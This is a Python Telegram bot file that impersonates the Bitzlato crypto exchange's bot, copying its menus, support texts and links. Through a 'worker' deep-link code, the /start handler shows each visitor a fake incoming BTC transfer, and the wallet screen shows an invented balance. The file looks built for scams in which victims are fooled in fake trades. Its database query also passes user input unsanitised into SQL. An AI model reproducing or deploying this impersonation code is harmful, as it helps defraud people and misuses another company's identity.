# -*- coding: utf-8 -*-
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.utils.markdown import hlink, hbold, hitalic
from aiogram.utils.emoji import emojize
from aiogram.utils.deep_linking import decode_payload
from aiogram.types import ParseMode, ReplyKeyboardMarkup, KeyboardButton
from aiogram.types.inline_keyboard import InlineKeyboardButton, InlineKeyboardMarkup
from requests import get
import sqlite3

TOKEN = "1111111111:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # Токен основного бота
btcincome = 0
rubincome = 0
dealcount = 0

inline_btn_1 = InlineKeyboardButton("🗞 Важные новости", url="https://t.me/bitzlato_ru")
inline_btn_2 = InlineKeyboardButton("Telegram группа", url="https://t.me/bitzlato_rus")
inline_btn_3 = InlineKeyboardButton(emojize(":chart_with_upwards_trend: Купить"), callback_data="btn1")
inline_btn_4 = InlineKeyboardButton(emojize(":chart_with_downwards_trend: Продать"), callback_data="btn2")
inline_kb1 = InlineKeyboardMarkup(resize_keyboard=True)
inline_kb1.row(inline_btn_1, inline_btn_2)
inline_kb1.row(inline_btn_3, inline_btn_4)

inline_btn_5 = InlineKeyboardButton(emojize(":dollar: Валюта"), callback_data="btn3")
inline_kb2 = InlineKeyboardMarkup(resize_keyboard=True).add(inline_btn_5)

button1 = KeyboardButton(emojize(":briefcase: Кошелек"))
button2 = KeyboardButton(emojize(":bar_chart: Обмен BTC/RUB"))
button3 = KeyboardButton(emojize(":rocket: О сервисе"))
button4 = KeyboardButton(emojize(":wrench: Настройки"))
button5 = KeyboardButton(emojize(":link: Привязать WEB аккаунт"))
button6 = KeyboardButton(emojize(":moyai: Забетонировать"))
markup_big = ReplyKeyboardMarkup(resize_keyboard=True)
markup_big.row(button1, button2)
markup_big.row(button3, button4)
markup_big.row(button5, button6)

button7 = InlineKeyboardButton(emojize(":inbox_tray: Внести"), callback_data="btn4")
button8 = InlineKeyboardButton(emojize(":outbox_tray: Вывести"), callback_data="btn5")
button9 = InlineKeyboardButton(emojize(":gift: BTC чек"), callback_data="btn6")
button10 = InlineKeyboardButton(emojize(":bookmark_tabs: Отчеты"), callback_data="btn7")
button11 = InlineKeyboardButton(emojize(":bank: Заработать"), callback_data="btn8")
markup_big2 = InlineKeyboardMarkup(resize_keyboard=True)
markup_big2.row(button7, button8)
markup_big2.row(button9, button10)
markup_big2.add(button11)

button12 = InlineKeyboardButton(emojize(":chart_with_upwards_trend: Купить"), callback_data="btn9")
button13 = InlineKeyboardButton(emojize(":chart_with_downwards_trend: Продать"), callback_data="btn10")
button14 = InlineKeyboardButton(emojize(":newspaper: Мои объявления"), callback_data="btn11")
button15 = InlineKeyboardButton(emojize(":tennis: Без. Режим"), callback_data="btn12")
markup_big3 = InlineKeyboardMarkup(resize_keyboard=True)
markup_big3.row(button12, button13)
markup_big3.row(button14, button15)

button16 = InlineKeyboardButton("🗞 Важные новости", url="https://t.me/bitzlato_ru")
button17 = InlineKeyboardButton(emojize(":gem: Продукты"), callback_data="btn13")
button18 = InlineKeyboardButton(emojize(":man_technologist: Поддержка"), url="https://telegram.me/HELP_BITZLATO_BOT")
button19 = InlineKeyboardButton(emojize(":page_facing_up: Условия"), url="https://bitzlato.com/terms-of-service-bitzlato/")
button20 = InlineKeyboardButton(emojize(":white_check_mark: Верификация"), url="https://check.changebot.org/#!/id_14379549")
button21 = InlineKeyboardButton(emojize(":necktie: Реферальная программа"), callback_data="btn14")
button22 = InlineKeyboardButton(emojize(":bank: Заработать"), callback_data="btn15")
markup_big4 = InlineKeyboardMarkup(resize_keyboard=True)
markup_big4.add(button16)
markup_big4.row(button17, button18)
markup_big4.row(button19, button20)
markup_big4.add(button21)
markup_big4.add(button22)

button23 = InlineKeyboardButton(emojize(":earth_africa: Язык"), callback_data="btn16")
button24 = InlineKeyboardButton(emojize(":bar_chart: Курс BTC"), callback_data="btn17")
button25 = InlineKeyboardButton(emojize(":dollar: Валюта"), callback_data="btn18")
button26 = InlineKeyboardButton(emojize(":bust_in_silhouette: Имя Пользователя"), callback_data="btn19")
button27 = InlineKeyboardButton(emojize(":star: Избранные адреса"), callback_data="btn20")
button28 = InlineKeyboardButton(emojize(":tennis: Сохранять реквизиты"), callback_data="btn21")
button29 = InlineKeyboardButton(emojize(":globe_with_meridians: Часовой пояс"), callback_data="btn22")
button30 = InlineKeyboardButton(emojize(":calling: Управление уведомлениями"), callback_data="btn23")
markup_big5 = InlineKeyboardMarkup(resize_keyboard=True)
markup_big5.row(button23, button24)
markup_big5.row(button25, button26)
markup_big5.row(button27, button28)
markup_big5.row(button29, button30)

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=["start"])
async def process_start_command(message: types.Message):
    dataarray = []
    args = message.get_args()
    if args != "":
        conn = sqlite3.connect("codedb.db")
        cur = conn.cursor()
        exc = cur.execute(f"SELECT workername, rubcur, btccur FROM codes WHERE code=\"{args}\"")
        if exc != []:
            for i in exc:
                dataarray.append(i[0])
                dataarray.append(i[1])
                dataarray.append(i[2])
                workername = dataarray[0]
                global rubincome
                rubincome = i[1]
                global btcincome
                btcincome = i[2]
                global dealcount
                dealcount = 1
        conn.close()
    firstline = emojize(hbold(f"Приветствую, {message.from_user.first_name}!") + "\n\nЭто телеграм бот криптоплатформы " + hlink("Bitzlato.bz", "https://bitzlato.bz") + " для обмена криптовалюты " + hbold("Bitcoin (BTC)") + " и фиатных денег. А также быстрый и бесплатный кошелек!\n\n:information_source: КАК ИСПОЛЬЗОВАТЬ:\n" + hlink("ВИДЕО ЗДЕСЬ", "https://www.youtube.com/watch?v=BdUBz4qujTk&t=33s"))
    await bot.send_message(message.chat.id, firstline, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=markup_big)
    await bot.send_message(message.chat.id, emojize(hbold("Следите за новостями сервиса: ") + "@Bitzlato_ru\n" + hbold("Узнайте о других продуктах компании: ") + hlink("Bitzlato.bz", "https://bitzlato.bz/") + "\n" + hbold("Форум пользователей криптоплатформы:\nhttps://talk.bitzlato.com/")), reply_markup=inline_kb1, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    await bot.send_message(message.chat.id, emojize(":dollar: " + hbold("Валюта") + "\n\nВыберите валюту. Этот фильтр влияет на просмотр и создание объявлений.\n\nСейчас используется " + hbold("«RUB».") + "\n\nВы можете менять этот параметр в любое время в разделе \"Настройки\"."), reply_markup=inline_kb2, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    if dataarray != []:
        transmsg = "Вы получили " + hbold(f"{btcincome} BTC") + f" ({rubincome} RUB) от /u{workername}"
        await bot.send_message(message.chat.id, transmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@dp.message_handler(lambda message: message.text == emojize(":briefcase: Кошелек"))
async def kbresp1(message: types.Message):
    koshelekmsg = emojize(":briefcase: " + hbold("Кошелек BTC\n\nБаланс: ") + f"{str(btcincome)} BTC\n" + hbold("Примерно: ") + f"{str(rubincome)} RUB\n" + hbold("Заблокировано: ") + f"0 BTC\n\nЗа 0 дней вами проведено {str(dealcount)} успешных сделок на общую сумму {str(btcincome)} BTC.\n\n:handshake: " + hbold("Приглашено: ") + "0 пользователей\n:moneybag: " + hbold("Заработано: ") + "0 BTC\n\n" + hbold("Рейтинг: ") + ":baby: 0\n" + hbold("Отзывы: ") + "(0):thumbsup: (0):thumbsdown:\n\n" + hbold("Верификация: ") + hlink("Нет", "https://check.changebot.org/#!/id_14379549"))
    await bot.send_message(message.chat.id, koshelekmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=markup_big2)

@dp.message_handler(lambda message: message.text == emojize(":bar_chart: Обмен BTC/RUB"))
async def kbresp2(message: types.Message):
    btcprice = "".join(list(get("https://api.coindesk.com/v1/bpi/currentprice/RUB.json").json()["bpi"]["RUB"]["rate"].replace(",", " ").replace(".", ","))[:-2])
    obmenmsg = emojize(":bar_chart: " + hbold("Обмен BTC/RUB") + "\n\nЗдесь Вы совершаете сделки с людьми, а бот выступает как гарант.\n\n:white_check_mark: Вы находитесь в безопасном режиме. Его можно отключить после проведения 2х сделок.\n\n:warning: Напоминаем, что все комиссии должны быть включены в курс, покупатель должен отправлять точную сумму, как указанно в сделке!\n\n:robot: В случае нарушения данного правила, просим сообщить в службу поддержки @HELP_BITZLATO_BOT\n\n" + hbold("Биржевой курс: ") + f"{btcprice} RUB (Bittrex)")
    await bot.send_message(message.chat.id, obmenmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=markup_big3)

@dp.message_handler(lambda message: message.text == emojize(":rocket: О сервисе"))
async def kbresp3(message: types.Message):
    aboutmsg = emojize(hbold(f"Приветствую, {message.from_user.first_name}!") + "\n\nЭто телеграм бот криптоплатформы " + hlink("Bitzlato.bz", "https://bitzlato.bz") + " для обмена криптовалюты " + hbold("Bitcoin (BTC)") + " и фиатных денег. А также быстрый и бесплатный кошелек!\n\nСервис работает как доска объявлений. Покупка и продажа происходит с другими людьми. Bitzlato выступает гарантом сделки.\n\nТакже в криптоплатформу входят боты для обмена других криптовалют. Ссылки на них вы найдете в меню бота.\n\n:information_source: КАК ИСПОЛЬЗОВАТЬ:\n" + hlink("ВИДЕО ЗДЕСЬ", "https://www.youtube.com/watch?v=BdUBz4qujTk&t=33s"))
    await bot.send_message(message.chat.id, aboutmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=markup_big4)

@dp.message_handler(lambda message: message.text == emojize(":wrench: Настройки"))
async def kbresp4(message: types.Message):
    settingsmsg = emojize(":hammer_and_wrench: " + hbold("Настройки\n\n") + "Что Вы хотите изменить?\n\n:warning: Отображение Telegram логина не рекомендуется и доступно только для опытных пользователей в связи с возможным мошенничеством.\n\n" + hbold("Текущий логин: ") + "/uMadMarionTheFifth.")
    await bot.send_message(message.chat.id, settingsmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=markup_big5)

@dp.message_handler(lambda message: message.text == emojize(":link: Привязать WEB аккаунт"))
async def kbresp5(message: types.Message):
    linkmsg = "Привязывание WEB аккаунта временно недоступно, так как идет перезапуск биржи Bitzlato. Все ордера были отменены, а балансы доступны через ботов Bitzlato или " + hlink("веб-версию", "https://bitzlato.bz/p2p")
    await bot.send_message(message.chat.id, linkmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@dp.message_handler(lambda message: message.text == emojize(":moyai: Забетонировать"))
async def kbresp6(message: types.Message):
    betonmsg = "Бетонирование временно недоступно, так как идет перезапуск биржи Bitzlato. Все ордера были отменены, а балансы доступны через ботов Bitzlato или " + hlink("веб-версию", "https://bitzlato.bz/p2p")
    await bot.send_message(message.chat.id, betonmsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@dp.message_handler(commands=["uMadMarionTheFifth"])
async def aboutprofile(message: types.Message):
    profilemsg = emojize(f"За 0 дней /uMadMarionTheFifth провел {str(dealcount)} успешных сделок на общую сумму {str(btcincome)} BTC.\n\n" + hbold("Верификация: ") + "Нет\n\n" + hbold("Рейтинг: ") + ":baby: 0\n" + hbold("Отзывы: ") + "(0):thumbsup: (0):thumbsdown:\n" + hbold("Успешных сделок: ") + f"{str(dealcount)}\n" + hbold("Отменённых сделок: ") + "0\n" + hbold("Поражений в спорах: ") + "0\n" + hbold("Доверяют пользователей: ") + "0\n" + hbold("Заблокирован пользователями: ") + "0\n")
    await bot.send_message(message.chat.id, profilemsg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@dp.message_handler()
async def unknown_command(message: types.Message):
    if message.text.startswith("/u"):
        await bot.send_message(message.chat.id, emojize(":cry: Упс!\n\nНе найдено"), parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        return
    um1 = emojize(":warning: " + hbold("Внимание, вероятнее всего, была введена неверная команда!") + "\n\n:grey_exclamation: Сотрудники сервиса пишут ")
    um2 = emojize(hbold("только внутри этого бота") + " или через @HELP_BITZLATO_BOT и могут провести все необходимые действия самостоятельно!\n\n:round_pushpin: Всегда проверяйте телеграм логин ботов и портала поддержки!\n:round_pushpin: Вывод автоматический через раздел \"Кошелек\",\nадминистрация НЕ выводит в ручном режиме!\n\n:calling: ")
    um3 = emojize(hitalic("Для обеспечения безопасности средств необходимо установить \'Two step verification\' (2FA) в настройках Telegram и не передавать свой телефонный номер и любые секретные коды кому-либо (даже сотрудникам Telegram или changeBot)!") + "\n\n" + hbold("Служба поддержки: ") + "@HELP_BITZLATO_BOT\n" + hbold("Общение: ") + "https://talk.bitzlato.com/")
    unknownmessage = um1 + um2 + um3
    #python doesnt accept more than 75 or 150 symbols in one line
    await bot.send_message(message.chat.id, unknownmessage, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

if __name__ == '__main__':
    executor.start_polling(dp)